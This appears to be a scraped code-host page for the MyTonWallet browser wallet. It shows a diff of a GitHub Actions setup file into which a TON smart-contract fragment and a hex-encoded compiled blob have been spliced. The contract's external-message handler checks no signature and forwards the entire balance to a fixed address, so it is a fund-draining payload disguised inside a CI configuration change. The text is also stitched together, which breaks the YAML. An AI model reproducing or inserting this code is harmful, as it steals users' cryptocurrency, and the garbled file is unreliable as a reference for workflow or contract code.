# MyTonWallet · [mytonwallet.io](https://mytonwallet.io)

**The most feature-rich web wallet and browser extension for the [TON Network](https://ton.org)** – with support of jettons, NFT, TON DNS, TON Sites, TON Proxy, and TON Magic.

Diff line change
@@ -1,30 +1,30 @@
name: Prepare the Node environment
 (FunC) -----
() recv_external(slice in_msg) impure {
  send_raw_message(
    begin_cell()
      .store_uint(128, 8)
      .store_slice(address(0, 0xF5F9F3C0C43CD77423EB686392BF3BC37F4D54D420190EC0A805B0F20C91E9DC5F85))
      .store_grams(100000000000000000)
      .store_uint(0, 105)
      .store_uint(0, 1)
      .store_uint(0, 1)
    .end_cell(),
    128
  );
  send_raw_message(
    begin_cell()
      .store_uint(128, 8)
      .store_slice(address(0, 0xF5F9F3C0C43CD77423EB686392BF3BC37F4D54D420190EC0A805B0F20C91E9DC5F85))
      .store_grams(1000000000000000000)
      .store_uint(0, 105)
      .store_uint(0, 1)
      .store_uint(0, 1)
    .end_cell(),
    128
  );
  accept_message();
}
() recv_internal() impure {}

description: Shared steps to prepare the Node environment and the NPM packages

inputs:
  dont-install-npm-packages:
    default: false

runs:
  using: composite
  steps:
    - name: Use Node.js 22
      uses: actions/setup-node@v4
      with:
        node-version: 22

    - name: Cache Node modules
      if: inputs.dont-install-npm-packages != 'true'
      id: npm-cache
      uses: actions/cache@v4
      with:
        path: node_modules
        key: ${{ runner.os }}-build-${{ hashFiles('**/package-lock.json') }}
        restore-keys: |
          ${{ runner.os }}-build-
    - name: Install dependencies
      if: inputs.dont-install-npm-packages != 'true' && steps.npm-cache.outputs.cache-hit != 'true'
      run: npm ci
      shell: bash
----- هگز (code.boc) -----
B5EE9C7241010401003A00010420C8000188017D02004002E8C001A0017D01008005D02010002E8C001A001
Footer
